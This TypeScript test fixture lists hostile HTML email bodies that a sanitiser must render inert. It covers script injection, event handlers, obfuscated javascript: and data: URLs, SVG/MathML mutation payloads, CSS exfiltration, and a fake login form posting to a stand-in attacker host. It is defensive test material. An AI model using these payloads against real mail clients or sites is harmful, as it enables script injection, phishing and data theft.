/**
 * Hostile mail bodies. Every entry must come out of the sanitiser inert; the
 * test checks the result structurally, so entries need no expected output.
 */
export interface HostileCase {
  name: string;
  html: string;
}

const B64_SCRIPT = "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";

export const SCRIPT_CASES: HostileCase[] = [
  { name: "plain script", html: "<p>hello</p><script>alert(1)</script>" },
  { name: "script with src", html: '<script src="https://evil.example/x.js"></script>ok' },
  { name: "split script tag", html: "<scr<script>ipt>alert(1)</scr</script>ipt>" },
  { name: "doubled angle brackets", html: "<<script>script>alert(1)<</script>/script>" },
  { name: "script hidden behind a broken img", html: '<img """><script>alert(1)</script>">' },
  { name: "script inside a table", html: "<div><table><tr><td><script>alert(1)</script></td></tr></div></table>" },
  { name: "script in template", html: "<template><script>alert(1)</script><img src=x onerror=alert(1)></template>" },
  { name: "script in conditional comment", html: "<!--[if gte mso 9]><script>alert(1)</script><![endif]-->text" },
  { name: "markup in a comment", html: "<!--<img src=x onerror=alert(1)>-->text" },
  { name: "xmp raw text", html: "<xmp><script>alert(1)</script></xmp>" },
  { name: "plaintext", html: "before<plaintext><script>alert(1)</script>" },
  { name: "title and textarea", html: "<title><script>alert(1)</script></title><textarea><script>alert(1)</script></textarea>" },
  { name: "noscript breakout", html: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>' },
  { name: "unknown element with script child", html: "<x-widget><script>alert(1)</script>kept</x-widget>" },
];

export const HANDLER_CASES: HostileCase[] = [
  { name: "img onerror", html: "<img src=x onerror=alert(1)>" },
  { name: "img onerror with slashes", html: '<img src=x onerror="alert(1)"//' },
  { name: "img onload on a real image", html: '<img src="https://ok.example/a.png" onload="alert(1)">' },
  { name: "body onload", html: "<body onload=alert(1)>text</body>" },
  { name: "details ontoggle", html: "<details open ontoggle=alert(1)>x</details>" },
  { name: "marquee onstart", html: "<marquee onstart=alert(1)>x</marquee>" },
  { name: "video source onerror", html: "<video><source onerror=alert(1)></video>" },
  { name: "audio onerror", html: "<audio src=x onerror=alert(1)></audio>" },
  { name: "input autofocus onfocus", html: "<input autofocus onfocus=alert(1)>" },
  { name: "link onclick", html: '<a href="https://ok.example/" onclick="alert(1)">x</a>' },
  { name: "pointer and mouse handlers", html: "<div onpointerover=alert(1) onmouseover=alert(1) ONCLICK=alert(1)>x</div>" },
  { name: "handler on unknown element", html: "<x-custom onclick=alert(1)>text</x-custom>" },
  { name: "handler with odd separators", html: "<div/onclick=alert(1)>x</div><p\nonmouseenter\n=\nalert(1)>y</p>" },
  { name: "animation handlers", html: '<div style="animation-name:x" onanimationstart="alert(1)" onwebkitanimationend=alert(1)>x</div>' },
  { name: "identifiers that clobber the document", html: '<img name="body" src="https://ok.example/a.png"><div id="location">x</div><a id="cookie" name="forms">y</a>' },
];

export const URL_CASES: HostileCase[] = [
  { name: "javascript href", html: '<a href="javascript:alert(1)">x</a>' },
  { name: "mixed case scheme", html: '<a href="JaVaScRiPt:alert(1)">x</a>' },
  { name: "decimal entities", html: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>' },
  { name: "hex entities without semicolons", html: '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>' },
  { name: "named colon entity", html: '<a href="javascript&colon;alert(1)">x</a>' },
  { name: "numeric colon entity", html: '<a href="javascript&#58;alert(1)">x</a>' },
  { name: "tab inside the scheme", html: '<a href="jav&#x09;ascript:alert(1)">x</a>' },
  { name: "newline inside the scheme", html: '<a href="jav&#x0A;ascript:alert(1)">x</a>' },
  { name: "carriage return inside the scheme", html: '<a href="jav&#x0D;ascript:alert(1)">x</a>' },
  { name: "raw newline inside the scheme", html: '<a href="java\nscript:alert(1)">x</a>' },
  { name: "leading control characters", html: '<a href=" &#14;  javascript:alert(1)">x</a>' },
  { name: "leading control character 1", html: '<a href="&#1;javascript:alert(1)">x</a>' },
  { name: "null byte inside the scheme", html: '<a href="java\u0000script:alert(1)">x</a>' },
  { name: "padded entity", html: '<a href="&#0000106avascript:alert(1)">x</a>' },
  { name: "vbscript", html: '<a href="vbscript:msgbox(1)">x</a>' },
  { name: "data html base64", html: `<a href="data:text/html;base64,${B64_SCRIPT}">x</a>` },
  { name: "data html plain", html: '<a href="data:text/html,<script>alert(1)</script>">x</a>' },
  { name: "data html mixed case with spaces", html: `<a href="  DaTa:TeXt/HtMl;base64,${B64_SCRIPT}">x</a>` },
  { name: "data html with entity colon", html: `<a href="data&colon;text/html;base64,${B64_SCRIPT}">x</a>` },
  { name: "data svg link", html: '<a href="data:image/svg+xml,<svg onload=alert(1)>">x</a>' },
  { name: "data png as a link", html: '<a href="data:image/png;base64,AAAA">x</a>' },
  { name: "file, blob, ftp and app schemes", html: '<a href="file:///etc/passwd">a</a><a href="blob:https://x/1">b</a><a href="ftp://x/">c</a><a href="intent://x#Intent;end">d</a><a href="ms-msdt:/id">e</a><a href="tel:+1555">f</a>' },
  { name: "relative and fragment links", html: '<a href="/account/delete">a</a><a href="#top">b</a><a href="index.html">c</a><a href="?q=1">d</a>' },
  { name: "credentials in the authority", html: '<a href="https://bank.example@evil.example/login">x</a>' },
  { name: "target and rel override", html: '<a href="https://ok.example/" target="_top" rel="opener">x</a>' },
  { name: "ping attribute", html: '<a href="https://ok.example/" ping="https://evil.example/p">x</a>' },
  { name: "javascript image", html: '<img src="javascript:alert(1)">' },
  { name: "svg data image", html: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">' },
  { name: "svg data image, plain", html: '<img src="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22alert(1)%22/>">' },
  { name: "data html image", html: `<img src="data:text/html;base64,${B64_SCRIPT}">` },
  { name: "malformed data image", html: '<img src="data:image/png;base64,AAAA&quot; onerror=&quot;alert(1)">' },
  { name: "data image with a smuggled parameter", html: '<img src="data:image/png;charset=x,<svg onload=alert(1)>;base64,AAAA">' },
  { name: "srcset and background attributes", html: '<img srcset="https://evil.example/x 1x" src="https://ok.example/a.png"><table background="https://evil.example/t.gif"><tr><td background="javascript:alert(1)">x</td></tr></table>' },
  { name: "dangling markup image", html: "<img src='https://evil.example/collect?html=<p>secret token 123</p><p>more" },
  { name: "dangling markup link", html: '<a href=https://evil.example/?x=<b>secret</b> <p>next' },
  { name: "area and map", html: '<map name="m"><area href="javascript:alert(1)" shape="rect" coords="0,0,9,9"></map><img usemap="#m" src="https://ok.example/a.png">' },
];

export const FOREIGN_CASES: HostileCase[] = [
  { name: "svg onload", html: "<svg onload=alert(1)></svg>after" },
  { name: "svg script", html: "<svg><script>alert(1)</script></svg>" },
  { name: "svg script href", html: '<svg><script href="data:text/javascript,alert(1)"></script></svg>' },
  { name: "svg foreignObject", html: '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe><body onload=alert(1)></body></foreignObject></svg>' },
  { name: "svg link", html: '<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">click</text></a></svg>' },
  { name: "svg animate", html: '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate><set attributeName="href" to="javascript:alert(1)"></set></svg>' },
  { name: "svg use", html: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"></use></svg>' },
  { name: "svg image", html: '<svg><image href="https://evil.example/t.png" onerror="alert(1)"></image></svg>' },
  { name: "svg style breakout", html: "<svg><style>{font-family:'<iframe/onload=alert(1)>'}</style></svg>" },
  { name: "math link", html: '<math><mi xlink:href="javascript:alert(1)">x</mi><maction actiontype="statusline#javascript:alert(1)">y</maction></math>' },
  { name: "math annotation-xml", html: '<math><annotation-xml encoding="text/html"><script>alert(1)</script><img src=x onerror=alert(1)></annotation-xml></math>' },
];

/** Inputs built to change meaning between one parse and the next. */
export const MUTATION_CASES: HostileCase[] = [
  { name: "math mglyph style", html: '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">' },
  { name: "form in math", html: "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>" },
  { name: "svg p style", html: '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">' },
  { name: "math mtext mglyph", html: '<math><mtext><mglyph><style><math><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
  { name: "noembed and noframes", html: '<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed><noframes><a title="</noframes><script>alert(1)</script>"></a></noframes>' },
  { name: "style element with markup in a string", html: "<style>p{font-family:'</style><img src=x onerror=alert(1)>'}</style><p>x</p>" },
  { name: "style attribute with a closing tag", html: "<p style=\"font-family:'</style><img src=x onerror=alert(1)>'\">x</p>" },
  { name: "attribute that closes itself", html: '<a title="&quot;><script>alert(1)</script>" href="https://ok.example/">t</a><img alt="&quot;><img src=x onerror=alert(1)>" src="https://ok.example/a.png">' },
  { name: "comment closer in an attribute", html: '<div title="--><script>alert(1)</script>">x</div><div title="--!><img src=x onerror=alert(1)>">y</div>' },
  { name: "select in a table caption", html: "<table><caption><select><option></caption></table><img src=x onerror=alert(1)>" },
  { name: "nested forms and tables", html: '<form><table><form action="https://evil.example/"><tr><td><input name=q></td></tr></form></table></form>' },
  { name: "nested links", html: '<a href="https://ok.example/1"><table><a href="javascript:alert(1)">inner</a></table>outer</a>' },
  { name: "paragraph inside a heading inside a list", html: "<ul><li><h1><p><li><div><p></h1></li><script>alert(1)</script></ul>" },
  { name: "backticks and unbalanced quotes", html: '<img src=`x` alt="`><script>alert(1)</script>"><p title=\'"\'>x</p>' },
  { name: "listing and pre newlines", html: "<listing>\n<img src=x onerror=alert(1)></listing><pre>\n\n<b onclick=alert(1)>x</b></pre>" },
  { name: "unclosed attribute swallowing markup", html: '<a href="javascript:alert(1)' },
  { name: "deep nesting", html: `${"<div><span>".repeat(700)}<img src=x onerror=alert(1)><script>alert(1)</script>deep${"</span></div>".repeat(700)}` },
  { name: "deep nesting of formatting", html: `${"<b><i>".repeat(600)}<a href="javascript:alert(1)">x</a>` },
];

export const STYLE_CASES: HostileCase[] = [
  { name: "import in a style element", html: "<style>@import url(https://evil.example/x.css);</style><p>x</p>" },
  { name: "import with a string", html: '<style>@import "https://evil.example/x.css";</style><p>x</p>' },
  { name: "remote background in a style element", html: "<style>body{background:url(https://evil.example/track)} p{color:red}</style><p>x</p>" },
  { name: "full-page overlay", html: '<style>*{position:fixed;top:0;left:0;width:100%;height:100%}</style><a href="https://evil.example/" style="position:fixed;inset:0;z-index:99999">Click</a>' },
  { name: "font face", html: "<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)} p{font-family:x}</style><p>x</p>" },
  { name: "attribute value exfiltration", html: '<style>input[value^="a"]{background:url(https://evil.example/a)}</style><p>x</p>' },
  { name: "javascript url in a style attribute", html: '<div style="background:url(javascript:alert(1))">x</div>' },
  { name: "expression", html: '<div style="width: expression(alert(1))">x</div><p style="x:expression(alert(1))">y</p>' },
  { name: "expression with comments and case", html: '<div style="width: EXPRE/**/SSION(alert(1))">x</div>' },
  { name: "escaped url", html: '<div style="background-image:\\75\\72\\6c(https://evil.example/t)">x</div>' },
  { name: "escaped url with spaces", html: '<div style="background-image:\\000075 rl(https://evil.example/t)">x</div>' },
  { name: "comment-split url", html: '<div style="background:u/**/rl(https://evil.example/t)">x</div>' },
  { name: "url with entity and control character", html: '<div style="background:url(&#1;javascript:alert(1))">x</div>' },
  { name: "uppercase url with whitespace", html: '<div style="background: URL ( \'https://evil.example/t\' )">x</div>' },
  { name: "image-set and image functions", html: '<div style="background-image:image-set(\'https://evil.example/t\' 1x);list-style-image:image(\'https://evil.example/u\')">x</div>' },
  { name: "moz binding and behavior", html: '<div style="-moz-binding:url(https://evil.example/x.xml#x);behavior:url(x.htc)">x</div>' },
  { name: "position fixed", html: '<div style="position:fixed;top:0;left:0;right:0;bottom:0">x</div><div style="position : FIXED">y</div><div style="position:sticky">z</div>' },
  { name: "position via escapes and important", html: '<div style="position:\\66ixed !important;pos\\69tion:fixed">x</div>' },
  { name: "import in a style attribute", html: "<div style=\"@import 'https://evil.example/x.css';color:red\">x</div>" },
  { name: "style attribute closing the sheet", html: '<div style="color:red;}</style><script>alert(1)</script>">x</div>' },
  { name: "css variables and attr", html: '<div style="--x:url(https://evil.example/t);background:var(--x);content:attr(title)">x</div>' },
  { name: "link stylesheet", html: '<link rel="stylesheet" href="https://evil.example/x.css"><link rel="import" href="https://evil.example/x.html">x' },
  { name: "style element closing itself inside a comment", html: "<style><!--</style><script>alert(1)</script>--></style>" },
  { name: "style with html comment tokens", html: "<style><!-- p{color:red} --></style><style>/* </style><img src=x onerror=alert(1)> */</style>" },
];

export const NAVIGATION_AND_FORM_CASES: HostileCase[] = [
  { name: "meta refresh", html: '<meta http-equiv="refresh" content="0;url=https://evil.example/">text' },
  { name: "meta refresh with javascript", html: '<meta http-equiv="Refresh" content="0; URL=javascript:alert(1)">text' },
  { name: "meta csp override", html: '<meta http-equiv="Content-Security-Policy" content="default-src *">text' },
  { name: "base href", html: '<base href="https://evil.example/"><a href="/login">Sign in</a>' },
  { name: "base target", html: '<base target="_top"><a href="https://ok.example/">x</a>' },
  { name: "iframe src", html: '<iframe src="https://evil.example/"></iframe>' },
  { name: "iframe srcdoc", html: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: "frameset", html: '<frameset><frame src="https://evil.example/"></frameset>' },
  { name: "object and embed", html: '<object data="https://evil.example/x.swf"><param name="movie" value="x"><embed src="https://evil.example/x.svg" type="image/svg+xml"></object>' },
  { name: "applet", html: '<applet code="Evil.class" archive="https://evil.example/e.jar">x</applet>' },
  { name: "login form", html: '<form action="https://evil.example/steal" method="post"><p>Your session expired.</p><input name="email"><input name="password" type="password"><button type="submit">Sign in</button></form>' },
  { name: "formaction", html: '<form><button formaction="javascript:alert(1)">Go</button><input type="submit" formaction="https://evil.example/"><input type="image" src="x" formaction="https://evil.example/"></form>' },
  { name: "form attribute on a loose control", html: '<form id="f" action="https://evil.example/"></form><input form="f" name="token"><button form="f">Send</button>' },
  { name: "select, textarea and datalist", html: "<select name=a><option>one</option></select><textarea name=b>secret</textarea><datalist id=d><option value=x></datalist><output>o</output>" },
  { name: "isindex", html: "<isindex action=javascript:alert(1) type=image>" },
  { name: "label and fieldset", html: "<fieldset><legend>Sign in</legend><label>Password <input type=password></label></fieldset>" },
  { name: "dialog and portal", html: '<dialog open>Enter password<form method="dialog"><input></form></dialog><portal src="https://evil.example/"></portal>' },
  { name: "canvas and video poster", html: '<canvas></canvas><video poster="https://evil.example/t.png" src="https://evil.example/v.mp4" autoplay></video>' },
];

export const HOSTILE_GROUPS: Array<{ group: string; cases: HostileCase[] }> = [
  { group: "scripts", cases: SCRIPT_CASES },
  { group: "event handlers", cases: HANDLER_CASES },
  { group: "URL schemes", cases: URL_CASES },
  { group: "svg and math", cases: FOREIGN_CASES },
  { group: "mutation on re-parse", cases: MUTATION_CASES },
  { group: "styles", cases: STYLE_CASES },
  { group: "navigation and forms", cases: NAVIGATION_AND_FORM_CASES },
];
